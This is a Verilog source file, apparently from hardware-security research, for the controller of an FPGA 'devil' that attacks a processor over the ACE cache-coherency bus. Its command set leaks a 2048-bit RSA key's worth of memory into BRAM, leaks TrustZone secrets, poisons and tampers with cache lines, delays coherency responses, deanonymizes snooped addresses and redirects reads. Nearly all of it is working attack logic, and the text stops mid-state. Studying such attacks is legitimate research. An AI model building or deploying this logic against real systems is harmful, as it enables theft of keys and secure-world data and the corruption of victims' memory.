`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 01/16/2024 03:56:21 PM
// Design Name: 
// Module Name: devil_controller
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////

`include "devil_in_fpga.vh"

module devil_controller#(
        parameter integer C_S_AXI_DATA_WIDTH    = 32, 
        parameter integer C_ACE_DATA_WIDTH      = 128,
        parameter integer C_ACE_ADDR_WIDTH      = 44,
        parameter integer C_ACE_ACSNOOP_WIDTH   = 4,
        parameter integer DEVIL_STATE_SIZE      = 5, // 32 states
        parameter integer CTRL_OUT_SIGNAL_WIDTH = 1
        )
        (
        input  wire                             ace_aclk,
        input  wire                             ace_aresetn,
        input  wire                             i_en,
        input  wire                       [3:0] i_cmd,
        input  wire                             i_trigger,
        input  wire      [C_ACE_ADDR_WIDTH-1:0] i_acaddr_snapshot,
        input  wire   [C_ACE_ACSNOOP_WIDTH-1:0] i_acsnoop_snapshot,
        output wire      [DEVIL_STATE_SIZE-1:0] o_fsm_devil_controller,
        output wire                             o_end_devil_controller,

        // Internal Signals, from devil to devil controller 
        input  wire                             i_r_phase,
        input  wire                             i_end_active_devil,
        input  wire                             i_active_devil_busy,
        input  wire                             i_end_passive_devil,
        input  wire                             i_end_reply,
        input  wire  [(C_ACE_DATA_WIDTH*4)-1:0] i_cache_line_active_devil,
        output wire  [(C_ACE_DATA_WIDTH*4)-1:0] o_cache_line_active_devil,
        output wire  [(C_ACE_DATA_WIDTH*4)-1:0] o_cache_line_passive_devil,
        output wire                             o_internal_adl_en,
        output wire                             o_internal_adt_en,
        output wire                             o_trigger_active, 
        input wire                              i_active_r_phase,

        // External Signals, from register file / PS
        input  wire   [(C_ACE_DATA_WIDTH*4)-1:0] i_external_cache_line, 
        input  wire   [(C_ACE_DATA_WIDTH*4)-1:0] i_external_cache_line_start_pattern, 
        input  wire   [(C_ACE_DATA_WIDTH*4)-1:0] i_external_cache_line_end_pattern, 
        input  wire                        [3:0] i_external_arsnoop_Data,
        input  wire                        [2:0] i_external_awsnoop_Data,
        input  wire                       [31:0] i_external_l_araddr_Data,
        input  wire                       [31:0] i_external_l_awaddr_Data,
        input  wire                        [4:0] i_start_pattern_size,
        input  wire                        [4:0] i_end_pattern_size,
        input  wire                       [31:0] i_word_index,
        input  wire     [C_S_AXI_DATA_WIDTH-1:0] i_delay_reg,
        input  wire                              i_stenden, 
        input  wire     [C_S_AXI_DATA_WIDTH-1:0] i_control_reg,
        input wire                        [31:0] i_base_addr_reg, 
        input wire                        [31:0] i_addr_size_reg, 
        output wire                       [15:0] o_deanon_counter,
        output wire       [C_ACE_ADDR_WIDTH-1:0] o_output_addr,
        input wire                        [31:0] i_sneak_target_snoop,
        input wire                        [31:0] i_sneak_target_addr, 
        input wire                        [31:0] i_sneak_target_size,
        input wire                        [31:0] i_sneak_addr,
        input wire                         [3:0] i_sneak_snoop,
        input wire                               i_sneak_en,
        input wire                               i_redirect_reads_en, 
        output wire   [(C_ACE_DATA_WIDTH*4)-1:0] o_cache_line,

        // Internal Signals, from devil controller to BRAM
        output wire                        		  o_trigger_bram_write,
	    output wire                        [14:0] o_bram_addr,
	    output wire    [(C_ACE_DATA_WIDTH*4)-1:0] o_bram_data,
        input  wire                               i_bram_end,

        // Internal Signals, from devil controller to devil passive
        output wire                               o_reply_type,
        output wire   [CTRL_OUT_SIGNAL_WIDTH-1:0] o_controller_signals,

        output wire                         [4:0] o_fsm_register_cl       

    );
//------------------------------------------------------------------------------
// FSM STATES AND DEFINES
//------------------------------------------------------------------------------
    parameter [DEVIL_STATE_SIZE-1:0]    DEVIL_IDLE              = 0,
                                        DEVIL_SEARCH_PATTERN    = 1,
                                        DEVIL_CHOOSE_CMD        = 2, 
                                        DEVIL_LEAK_KEY          = 3,
                                        DEVIL_LEAK_KEY_READ     = 4,
                                        DEVIL_LEAK_KEY_ST_BRAM  = 5,
                                        DEVIL_POISON_ACTION     = 6,
                                        DEVIL_REPLY             = 7,
                                        DEVIL_END_OP            = 8,
                                        DEVIL_PARTIAL_MATCH     = 9,
                                        DEVIL_READ_NEXT_CL      = 10,
                                        DEVIL_TAMPER_CL         = 11,
                                        DEVIL_DELAY_CR          = 12,
                                        DEVIL_DEANON_ADDR       = 13,
                                        DEVIL_DETECT_SNOOP      = 14,
                                        DEVIL_SNEAK_SNOOP       = 15,
                                        DEVIL_SNEAK_REPLY       = 16, 
                                        DEVIL_DUMMY_REPLY       = 17, 
                                        DEVIL_ISSUE_SNOOP       = 18,
                                        DEVIL_MONITOR_TRANS     = 19,
                                        DEVIL_REDIRECT          = 20,
                                        DEVIL_REDIRECT_READ     = 21,
                                        DEVIL_LEAK_SECRET_TZ    = 22;

    parameter [DEVIL_STATE_SIZE-1:0]    IDLE        = 0,
                                        WAIT_CL     = 1,
                                        OUTPUT_CL   = 2;

    `define CMD_LEAK        0
    `define CMD_POISON      1
    `define CMD_TAMPER_CL   2
    `define CMD_DELAY_CR    3
    `define CMD_DEANON      4
    `define CMD_HOLD        5
    `define CMD_REDIRECT    6
    `define CMD_LEAK_TZ     7
    `define CMD_CLEAN       8

    `define CL_LINE_BYTES   64
    `define CL_LINE_BITS    `CL_LINE_BYTES*8 // 512 bits
    `define PEM_SIZE        32'h6C0*8  // Number of bits to fetch -> Enough for a RSA key with 2048 bits

//------------------------------------------------------------------------------
// WIRES
//------------------------------------------------------------------------------
    wire    w_full_match;
    wire    w_partial_match;
    wire    [3:0] w_match_offset;
    wire    w_op_end;    
    wire    w_addr_filter;
//------------------------------------------------------------------------------
// REGISTERS
//------------------------------------------------------------------------------ 
    reg       [DEVIL_STATE_SIZE-1:0] fsm_devil_controller;       
    reg       [DEVIL_STATE_SIZE-1:0] fsm_register_cl;       
    reg       [C_ACE_ADDR_WIDTH-1:0] r_controller_araddr;
    reg                        [3:0] r_controller_arsnoop;
    reg       [C_ACE_ADDR_WIDTH-1:0] r_controller_awaddr;
    reg                        [2:0] r_controller_awsnoop;
    reg                        [1:0] r_controller_ardomain;
    reg                        [3:0] r_active_func;
    reg                              r_passive_func;
    reg                              r_trigger_reply;    
    reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_save_cache_line; 
    reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_write_cache_line_passive; 
    reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_write_cache_line_active; 
    reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_cache_line_to_ps; 
    reg                              r_read_snoop_en;
    reg                              r_write_snoop_en;
    reg                              r_trigger_active;
    reg                       [15:0] r_deanon_counter;
    reg       [C_ACE_ADDR_WIDTH-1:0] r_output_addr;
    reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_pattern;
    reg                        [4:0] r_pattern_size;
    reg                        [4:0] r_pattern_size_save;
    reg                        [3:0] r_match_offset;
    reg                              r_match_pattern_trigger; 
    reg                              r_target_snoop_detected; 
    reg                       [15:0] r_pem_size;
    reg                              r_trigger_bram_write;
    reg                       [14:0] r_bram_addr;
    reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_bram_data;
    reg                       [31:0] r_counter; 
    reg                              r_start_pattern_macth;
    reg                              r_one_shot;


//------------------------------------------------------------------------------
// INPUTS/OUTPUTS
//------------------------------------------------------------------------------
    assign o_fsm_devil_controller   = fsm_devil_controller;
    assign o_end_devil_controller  = (fsm_devil_controller == DEVIL_END_OP) ? 1 : 0;

    assign o_fsm_register_cl = fsm_register_cl;

    `include "devil_ctrl_defines.vh"
    
    assign o_controller_signals[CTRL_SIGNAL1_WIDTH-1:0]                   = r_controller_araddr;
    assign o_controller_signals[CTRL_SIGNAL2_WIDTH-1:CTRL_SIGNAL1_WIDTH]  = r_controller_arsnoop;
    assign o_controller_signals[CTRL_SIGNAL3_WIDTH-1:CTRL_SIGNAL2_WIDTH]  = r_controller_awaddr;
    assign o_controller_signals[CTRL_SIGNAL4_WIDTH-1:CTRL_SIGNAL3_WIDTH]  = r_controller_awsnoop;
    assign o_controller_signals[CTRL_SIGNAL5_WIDTH-1:CTRL_SIGNAL4_WIDTH]  = r_controller_ardomain;
    assign o_controller_signals[CTRL_SIGNAL6_WIDTH-1:CTRL_SIGNAL5_WIDTH]  = r_active_func;
    assign o_controller_signals[CTRL_SIGNAL7_WIDTH-1:CTRL_SIGNAL6_WIDTH]  = r_trigger_reply;
    assign o_reply_type = r_passive_func;

    assign o_cache_line_active_devil  = r_write_cache_line_active;
    assign o_cache_line_passive_devil = r_write_cache_line_passive;

    assign o_internal_adl_en = r_read_snoop_en;
    assign o_internal_adt_en = r_write_snoop_en;
    assign o_trigger_active  = r_trigger_active;

    assign o_trigger_bram_write     = r_trigger_bram_write;
    assign o_bram_addr              = r_bram_addr;
    assign o_bram_data              = r_bram_data;

    assign o_deanon_counter = r_deanon_counter;
    assign o_output_addr    = r_output_addr;

    assign o_cache_line = r_cache_line_to_ps;    

//------------------------------------------------------------------------------
// DEVIL-IN-THE-FPGA CONTROL REGISTERS
//------------------------------------------------------------------------------
    // Devil-in-the-fpga Control Reg parameters/bits
    wire [3:0] w_func;
    wire       w_mon_en; // Enable Transactions Monitor

    assign w_func = i_control_reg[8:5];
    assign w_mon_en = i_control_reg[21]; // Passive Data Tampering Enable 

//------------------------------------------------------------------------------
// Inernal Signals
//------------------------------------------------------------------------------
    assign w_addr_filter  = (i_acaddr_snapshot[31:0] >= i_base_addr_reg[31:0]) 
                         && (i_acaddr_snapshot[31:0] < (i_base_addr_reg[31:0] + i_addr_size_reg[31:0])) ? 1 : 0;


//------------------------------------------------------------------------------
// FSMs
//------------------------------------------------------------------------------
    always @(posedge ace_aclk)
    begin
        if(~ace_aresetn || !i_en)
            begin
            fsm_register_cl <= IDLE;
            r_cache_line_to_ps <= 0;
            end 
        else
            begin
                case (fsm_register_cl)                                                                                                                                 
                IDLE: 
                    begin
                        if(fsm_devil_controller == DEVIL_LEAK_SECRET_TZ)
                            fsm_register_cl <= WAIT_CL;
                        else 
                            fsm_register_cl <= fsm_register_cl;              
                    end
                WAIT_CL:  
                    begin 
                        if(i_end_active_devil)
                            fsm_register_cl <= OUTPUT_CL;   
                        else                                                
                            fsm_register_cl <= fsm_register_cl;              
                    end
                OUTPUT_CL:  
                    begin 
                        r_cache_line_to_ps  <= i_cache_line_active_devil;
                        fsm_register_cl     <= IDLE;                                                  
                    end
                default :                                                                
                    begin                                                                  
                        fsm_register_cl <= IDLE;                                     
                    end                                                                    
            endcase            
        end
    end    

    always @(posedge ace_aclk)
    begin
    if(~ace_aresetn || !i_en)
        begin
        fsm_devil_controller <= DEVIL_IDLE;
        r_trigger_reply <= 0;
        r_counter <= 0;
        r_pattern <= 0;
        r_one_shot <= 0;
        r_pem_size <= 0;
        r_bram_addr <= 0;
        r_bram_data <= 0;
        r_active_func <= 0;
        r_passive_func <= 0;
        r_output_addr <= 0;
        r_match_offset <= 0;
        r_pattern_size <= 0;
        r_trigger_active <= 0;
        r_deanon_counter <= 0;
        r_read_snoop_en <= 0;
        r_write_snoop_en <= 0;
        r_save_cache_line <= 0;
        r_pattern_size_save <= 0;
        r_controller_araddr <= 0;
        r_controller_awaddr <= 0;
        r_trigger_bram_write <= 0;
        r_controller_arsnoop <= 0;
        r_controller_awsnoop <= 0;
        r_start_pattern_macth <= 0;
        r_controller_ardomain <= 0;
        r_match_pattern_trigger <= 0;
        r_target_snoop_detected <= 0;
        r_write_cache_line_active <= 0;
        r_write_cache_line_passive <= 0;
        end 
    else
        begin
            case (fsm_devil_controller)                                                                                                                                 
            DEVIL_IDLE: // 0
                begin
                    r_passive_func <= `DUMMY_REPLY;
                    if(i_trigger)
                        if(w_mon_en) begin
                            if(!i_active_devil_busy)
                                fsm_devil_controller <= DEVIL_MONITOR_TRANS;     
                            else 
                                fsm_devil_controller <= DEVIL_DUMMY_REPLY;              
                        end
                        else
                            fsm_devil_controller <= DEVIL_CHOOSE_CMD;
                    else 
                        fsm_devil_controller <= fsm_devil_controller;              
                end
            DEVIL_MONITOR_TRANS: // Este estados têm de passar para o devil controller
                begin
                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
                    r_controller_araddr <= i_acaddr_snapshot;
                    r_controller_arsnoop <= 4'b0000; 
                    r_controller_ardomain <= 2'b00; 

                    // trigger read snoop
                    r_active_func <= `READ_SNOOP; // Read snoop
                    
                    // Enable Read Snoop
                    r_trigger_active <= 1;
                    r_read_snoop_en <= 1; // Enable Read Snoop (internal trigger)
                    // r_write_snoop_en <= 0; // En Write Snoop (internal trigger)

                     if(i_end_active_devil & r_trigger_active) begin
                        r_read_snoop_en <= 0; 
                        r_trigger_active  <= 0;
                        fsm_devil_controller <= DEVIL_SEARCH_PATTERN; 
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller; 
                end
            DEVIL_SEARCH_PATTERN: // 1
                begin 
                    r_save_cache_line <= i_cache_line_active_devil;

                    // Choose the Pattern to be searched for
                    r_pattern <= ((r_start_pattern_macth == 0) ? i_external_cache_line_start_pattern : i_external_cache_line_end_pattern);
                    r_pattern_size <= ((r_start_pattern_macth == 0) ? i_start_pattern_size : i_end_pattern_size);
                    
                    r_match_pattern_trigger <= 1;

                    if(w_op_end) begin
                        r_match_pattern_trigger <= 0;
                        // Match (when we just want to have 1 trigger pattern)
                        if(w_full_match) 
                            begin
                                // End Pattern Match (
                                if(i_stenden && r_start_pattern_macth)
                                    begin
                                            if(i_cmd[3:0] == `CMD_HOLD)
                                            // Sneak Snoop Reply
                                            fsm_devil_controller <= DEVIL_DETECT_SNOOP;
                                        else
                                            fsm_devil_controller <= DEVIL_REPLY;
                                        r_start_pattern_macth <= 0;
                                    end
                                else
                                // Start Pattern Match
                                    begin
                                        fsm_devil_controller <= DEVIL_CHOOSE_CMD;
                                        if(i_stenden)
                                            r_start_pattern_macth <= 1;
                                    end
                            end
                        else if(w_partial_match)  
                            begin
                                fsm_devil_controller <= DEVIL_READ_NEXT_CL;
                                r_match_offset <=  w_match_offset;
                                r_pattern_size_save <= r_pattern_size;
                            end
                        // Middle Condition (Snoops between Start & Stop)
                        else if(!w_full_match && !w_partial_match && i_stenden && r_start_pattern_macth) 
                            begin 
                                fsm_devil_controller <= DEVIL_CHOOSE_CMD; // Action
                            end
                        // !match && !i_stenden
                        else
                            begin 
                                if(i_cmd[3:0] == `CMD_HOLD)
                                    // Sneak Snoop Reply
                                    fsm_devil_controller <= DEVIL_DETECT_SNOOP;
                                else
                                    fsm_devil_controller <= DEVIL_REPLY;
                            end
                    end                                          
                end
            DEVIL_READ_NEXT_CL: // 9
                begin 
                    // Read Snoop
                    r_controller_araddr   <= (i_acaddr_snapshot+32'h40); // next CL
                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
                    r_controller_arsnoop  <= 4'b0000; // ReadNoSnoop
                    r_controller_ardomain <= 2'b00; // outer shareable

                    // Trigger Read Snoop
                    r_active_func <= `READ_SNOOP; // Read snoop

                    // Enable Read Snoop
                    r_read_snoop_en <= 1; 
                    r_trigger_active <= 1;

                    if(i_end_active_devil & r_trigger_active) begin
                        fsm_devil_controller <= DEVIL_PARTIAL_MATCH; 
                        r_read_snoop_en <= 0; 
                        r_trigger_active  <= 0;
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                               
                end
            DEVIL_PARTIAL_MATCH: // 10
                begin 
                    // Compare the remaining pattern 
                    r_pattern <= r_pattern >> ((r_pattern_size_save-r_match_offset)*32);
                    r_pattern_size <= r_match_offset;
                    r_match_pattern_trigger <= 1;
                    if(w_op_end) begin
                        r_match_pattern_trigger <= 0;
                        if(w_full_match) 
                            fsm_devil_controller <= DEVIL_CHOOSE_CMD;
                        else
                            fsm_devil_controller <= DEVIL_REPLY;
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                               
                end
            DEVIL_CHOOSE_CMD:  // 2
                begin
                    case (i_cmd[3:0])
                        `CMD_LEAK  : 
                        begin
                            fsm_devil_controller <= DEVIL_LEAK_KEY;
                        end
                        `CMD_POISON  : 
                        begin
                            fsm_devil_controller <= DEVIL_POISON_ACTION;
                        end
                        `CMD_TAMPER_CL  : 
                        begin
                            fsm_devil_controller <= DEVIL_TAMPER_CL;
                        end
                        `CMD_DELAY_CR  : 
                        begin
                            fsm_devil_controller <= DEVIL_DELAY_CR; 
                        end
                        `CMD_DEANON  : 
                        begin
                            fsm_devil_controller <= DEVIL_DEANON_ADDR; 
                        end
                        `CMD_HOLD  : 
                        begin
                            fsm_devil_controller <= DEVIL_DETECT_SNOOP; 
                        end
                        `CMD_REDIRECT:
                        begin
                            fsm_devil_controller <= DEVIL_REDIRECT; 
                        end
                        `CMD_LEAK_TZ:
                        begin
                            if(!r_one_shot) begin
                                r_one_shot <= 1;
                                fsm_devil_controller <= DEVIL_LEAK_SECRET_TZ; 
                            end
                            else
                                fsm_devil_controller <= DEVIL_DUMMY_REPLY;
                        end
                        `CMD_CLEAN:
                        begin
                            r_one_shot <= 0;
                            fsm_devil_controller <= DEVIL_DUMMY_REPLY;
                        end 
                        default : fsm_devil_controller <= DEVIL_DUMMY_REPLY;  // this should go to DEVIL_REPLY no???
                    endcase                                                      
                end
            DEVIL_LEAK_KEY: // 3
                begin 
                    if(r_pem_size == 0) 
                    begin 
                        r_pem_size <= `CL_LINE_BITS;
                        r_controller_araddr <= i_acaddr_snapshot;
                        fsm_devil_controller <= DEVIL_LEAK_KEY_READ;  
                        r_bram_addr <= 0; // BRAM Initial Address                                          
                    end
                    else 
                    begin
                        if(r_pem_size <= `PEM_SIZE) 
                        begin
                            r_pem_size <= r_pem_size + `CL_LINE_BITS;
                            r_controller_araddr <= r_controller_araddr + `CL_LINE_BYTES; // next CL
                            fsm_devil_controller <= DEVIL_LEAK_KEY_READ;                                           
                        end
                        else 
                        begin
                            r_pem_size <= 0;
                            fsm_devil_controller <= DEVIL_REPLY; 
                        end     
                    end                                                
                end
            DEVIL_LEAK_KEY_READ: //4
                begin 
                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
                    r_controller_ardomain <= 2'b00;
                    r_controller_arsnoop  <= 4'b0000;

                    // trigger read snoop
                    r_active_func <= `READ_SNOOP; // Read Snoop

                    // Enable Read Snoop
                    r_read_snoop_en <= 1; 
                    r_trigger_active <= 1;

                     if(i_end_active_devil & r_trigger_active) begin
                        r_read_snoop_en <= 0; 
                        r_trigger_active  <= 0;
                        fsm_devil_controller <= DEVIL_LEAK_KEY_ST_BRAM;     
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                       
                end
            DEVIL_LEAK_KEY_ST_BRAM: // 5
                begin 
                    r_trigger_bram_write <= 1;
                    r_bram_data <= i_cache_line_active_devil;

                    if(i_bram_end) begin
                        r_trigger_bram_write <= 0;
                        r_bram_addr <= r_bram_addr + 64; // cache line size
                        fsm_devil_controller <= DEVIL_LEAK_KEY;     
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                       
                end
            DEVIL_POISON_ACTION:  // 6
                begin 
                    // Write Snoop Data
                    r_write_cache_line_active <= i_external_cache_line;  // (just to test)

                    // config write snoop
                    r_controller_awaddr <= i_external_l_awaddr_Data;
                    r_controller_awsnoop <= i_external_awsnoop_Data;
                    r_controller_ardomain <= 2'b10; // outer shareable

                    // trigger write snoop
                    r_active_func <= `WRITE_SNOOP; // Write Snoop

                    r_write_snoop_en <= 1; // En Write Snoop
                    r_trigger_active <= 1;

                    if(i_end_active_devil & r_trigger_active) begin
                        r_write_snoop_en <= 0; 
                        r_trigger_active  <= 0;
                        fsm_devil_controller <= DEVIL_REPLY; 
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                                
                end
            DEVIL_TAMPER_CL: // 11  
                begin 
                    // Tamper CL with word granularity
                    r_save_cache_line[31+32*0:0+32*0]   =  i_word_index & 16'b0000000000000001 ? i_external_cache_line[31+32*0:0+32*0]   : r_save_cache_line[31+32*0:0+32*0]; 
                    r_save_cache_line[31+32*1:0+32*1]   =  i_word_index & 16'b0000000000000010 ? i_external_cache_line[31+32*1:0+32*1]   : r_save_cache_line[31+32*1:0+32*1];
                    r_save_cache_line[31+32*2:0+32*2]   =  i_word_index & 16'b0000000000000100 ? i_external_cache_line[31+32*2:0+32*2]   : r_save_cache_line[31+32*2:0+32*2];
                    r_save_cache_line[31+32*3:0+32*3]   =  i_word_index & 16'b0000000000001000 ? i_external_cache_line[31+32*3:0+32*3]   : r_save_cache_line[31+32*3:0+32*3];
                    r_save_cache_line[31+32*4:0+32*4]   =  i_word_index & 16'b0000000000010000 ? i_external_cache_line[31+32*4:0+32*4]   : r_save_cache_line[31+32*4:0+32*4];
                    r_save_cache_line[31+32*5:0+32*5]   =  i_word_index & 16'b0000000000100000 ? i_external_cache_line[31+32*5:0+32*5]   : r_save_cache_line[31+32*5:0+32*5];
                    r_save_cache_line[31+32*6:0+32*6]   =  i_word_index & 16'b0000000001000000 ? i_external_cache_line[31+32*6:0+32*6]   : r_save_cache_line[31+32*6:0+32*6];
                    r_save_cache_line[31+32*7:0+32*7]   =  i_word_index & 16'b0000000010000000 ? i_external_cache_line[31+32*7:0+32*7]   : r_save_cache_line[31+32*7:0+32*7];
                    r_save_cache_line[31+32*8:0+32*8]   =  i_word_index & 16'b0000000100000000 ? i_external_cache_line[31+32*8:0+32*8]   : r_save_cache_line[31+32*8:0+32*8];
                    r_save_cache_line[31+32*9:0+32*9]   =  i_word_index & 16'b0000001000000000 ? i_external_cache_line[31+32*9:0+32*9]   : r_save_cache_line[31+32*9:0+32*9];
                    r_save_cache_line[31+32*10:0+32*10] =  i_word_index & 16'b0000010000000000 ? i_external_cache_line[31+32*10:0+32*10] : r_save_cache_line[31+32*10:0+32*10];  
                    r_save_cache_line[31+32*11:0+32*11] =  i_word_index & 16'b0000100000000000 ? i_external_cache_line[31+32*11:0+32*11] : r_save_cache_line[31+32*11:0+32*11];  
                    r_save_cache_line[31+32*12:0+32*12] =  i_word_index & 16'b0001000000000000 ? i_external_cache_line[31+32*12:0+32*12] : r_save_cache_line[31+32*12:0+32*12];  
                    r_save_cache_line[31+32*13:0+32*13] =  i_word_index & 16'b0010000000000000 ? i_external_cache_line[31+32*13:0+32*13] : r_save_cache_line[31+32*13:0+32*13];  
                    r_save_cache_line[31+32*14:0+32*14] =  i_word_index & 16'b0100000000000000 ? i_external_cache_line[31+32*14:0+32*14] : r_save_cache_line[31+32*14:0+32*14];  
                    r_save_cache_line[31+32*15:0+32*15] =  i_word_index & 16'b1000000000000000 ? i_external_cache_line[31+32*15:0+32*15] : r_save_cache_line[31+32*15:0+32*15];     
                    
                    fsm_devil_controller <= DEVIL_REPLY;  
                end
            DEVIL_DELAY_CR: // 12 
                begin 
                    // Wait some cycles to respond (delay = delay_reg)
                    if(i_delay_reg == 0 || r_counter == (i_delay_reg-1) )
                    begin
                        // Dummy Reply
                        fsm_devil_controller <= DEVIL_REPLY;  
                        r_counter <= 0;
                    end
                    else
                    begin
                        r_counter <= r_counter + 1;
                        fsm_devil_controller <= fsm_devil_controller;
                    end                                
                end
            DEVIL_DEANON_ADDR: // 13  
                begin 
                    r_output_addr <= i_acaddr_snapshot;
                    r_deanon_counter <= r_deanon_counter + 1;
                    fsm_devil_controller <= DEVIL_REPLY;  
                end
            DEVIL_DETECT_SNOOP: // 14
                begin 
                    if( (
                           (i_acsnoop_snapshot == `READONCE             && i_sneak_target_snoop[0] )
                        || (i_acsnoop_snapshot == `READSHARED           && i_sneak_target_snoop[1] )
                        || (i_acsnoop_snapshot == `READCLEAN            && i_sneak_target_snoop[2] )
                        || (i_acsnoop_snapshot == `READNOTSHAREDDIRTY   && i_sneak_target_snoop[3] )
                        || (i_acsnoop_snapshot == `READUNIQUE           && i_sneak_target_snoop[4] )
                        || (i_acsnoop_snapshot == `CLEANUNIQUE          && i_sneak_target_snoop[5] )
                        || (i_acsnoop_snapshot == `MAKEUNIQUE           && i_sneak_target_snoop[6] )
                        || (i_acsnoop_snapshot == `CLEANSHARED          && i_sneak_target_snoop[7] )
                        || (i_acsnoop_snapshot == `CLEANINVALID         && i_sneak_target_snoop[8] )
                        || (i_acsnoop_snapshot == `MAKEINVALIDE         && i_sneak_target_snoop[9] )
                        ) && ((i_acaddr_snapshot[31:0] >= i_sneak_target_addr[31:0]) && (i_acaddr_snapshot[31:0] < (i_sneak_target_addr[31:0] + i_sneak_target_size[31:0]))))
                    begin
                        r_target_snoop_detected <= 1;
                        if(i_sneak_en)
                            fsm_devil_controller <= DEVIL_SNEAK_SNOOP;  
                        else
                            fsm_devil_controller <= DEVIL_REPLY;  
                    end
                    else
                    begin
                        fsm_devil_controller <= DEVIL_REPLY;  
                    end                                
                end
            DEVIL_SNEAK_SNOOP:  // 15
                begin 
                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
                    // r_controller_araddr <= i_external_l_araddr_Data;
                    // r_controller_arsnoop  <= i_external_arsnoop_Data;
                    r_controller_araddr <= i_sneak_addr;
                    r_controller_arsnoop <= i_sneak_snoop;
                    r_controller_ardomain <=  2'b10; // outer shareable

                    // trigger read snoop
                    r_active_func <= `READ_SNOOP; // Read Snoop

                    // Enable Read Snoop
                    r_read_snoop_en <= 1; 
                    r_trigger_active <= 1;

                    if(i_active_r_phase) begin
                        fsm_devil_controller <= DEVIL_SNEAK_REPLY;     
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                       
                end
            DEVIL_SNEAK_REPLY:  // 16
                begin 
                    r_trigger_reply <= 1;

                    r_passive_func <= `DATA_REPLY;
                    r_write_cache_line_passive <= 32'hF0F0_F0F0; // send dummy data

                    // Commented because the monitor is not working properly when
                    // with the sneak snoop / redirect writes features, because 
                    // they are both using the active devil. The monitor uses the
                    // active devil in a blocking way and the sneak snoop / redirect
                    // writes requires a non-blocking opertion. 
                    // if(w_mon_en) begin
                    //     r_passive_func <= `DATA_REPLY;
                    //     r_write_cache_line_passive <= r_save_cache_line; 
                    // end
                    // else
                    //     r_passive_func <= `DUMMY_REPLY;

                    // just for test porpuses
                    // if(i_end_active_devil) begin
                    if(i_end_reply && r_trigger_reply) begin
                        // r_read_snoop_en <= 0; // just for test porpuses
                        r_trigger_active  <= 0;
                        fsm_devil_controller <= DEVIL_END_OP;     
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                               
                end
            DEVIL_ISSUE_SNOOP:  // 18
                begin 
                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
                    r_controller_araddr <= i_sneak_addr;
                    r_controller_arsnoop <= i_sneak_snoop;
                    r_controller_ardomain <=  2'b10; // outer shareable

                    // trigger read snoop
                    r_active_func <= `READ_SNOOP; // Read Snoop

                    // Enable Read Snoop
                    r_read_snoop_en <= 1; 
                    r_trigger_active <= 1;

                    // just for test porpuses
                    // if(i_end_active_devil) begin
                    if(r_trigger_active) begin
                        // r_read_snoop_en <= 0; // just for test porpuses
                        r_trigger_active  <= 0;
                        fsm_devil_controller <= DEVIL_END_OP;     
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                       
                end
            DEVIL_REDIRECT: 
                begin
                    if(w_addr_filter) begin
                        fsm_devil_controller <= DEVIL_REDIRECT_READ; 
                    end
                    else
                        fsm_devil_controller <= DEVIL_DUMMY_REPLY;
                end
            DEVIL_REDIRECT_READ: 
                begin
                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
                    r_controller_araddr <= i_acaddr_snapshot;
                    r_controller_arsnoop <= 4'b0000; 
                    r_controller_ardomain <= 2'b00; 

                    // trigger read snoop
                    r_active_func <= `READ_SNOOP; // Read snoop
                    
                    // Enable Read Snoop
                    r_trigger_active <= 1;
                    r_read_snoop_en <= 1; // Enable Read Snoop (internal trigger)

                     if(i_end_active_devil & r_trigger_active) begin
                        r_read_snoop_en <= 0; 
                        r_trigger_active  <= 0;
                        fsm_devil_controller <= DEVIL_REPLY; 
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller; 
                end
            DEVIL_LEAK_SECRET_TZ:  // 22
                begin 
                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
                    r_controller_araddr <= i_sneak_addr;
                    r_controller_arsnoop <= i_sneak_snoop;
                    r_controller_ardomain <=  2'b10; // outer shareable

                    // trigger read snoop
                    r_active_func <= `READ_SNOOP; // Read Snoop

                    // Enable Read Snoop
                    r_read_snoop_en <= 1; 
                    r_trigger_active <= 1;

                    // just for test porpuses
                    // if(i_end_active_devil) begin
                    if(r_trigger_active) begin
                        // r_read_snoop_en <= 0; // just for test porpuses
                        r_trigger_active  <= 0;
                        fsm_devil_controller <= DEVIL_DUMMY_REPLY;     
                    end
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                       
                end
            DEVIL_REPLY:  // 7
                begin 
                    r_trigger_active <=  0;
                    r_write_snoop_en <= 0;
                    r_trigger_reply <= 1;
                    
                    if(w_mon_en || i_redirect_reads_en) begin
                        r_passive_func <= `DATA_REPLY;
                        if(w_mon_en)
                            r_write_cache_line_passive <= r_save_cache_line; 
                        else
                            r_write_cache_line_passive <= i_cache_line_active_devil; 
                    end
                    else
                        r_passive_func <= `DUMMY_REPLY;

                    if(i_end_reply && r_trigger_reply)
                        if(i_cmd[3:0] == `CMD_HOLD && r_target_snoop_detected)
                            fsm_devil_controller <= DEVIL_ISSUE_SNOOP; 
                        else
                            fsm_devil_controller <= DEVIL_END_OP; 
                    else
                        fsm_devil_controller <= fsm_devil_controller;                                               
                end
            DEVIL_DUMMY_REPLY:  // 17
                begin 
                    r_trigger_reply <= 1;
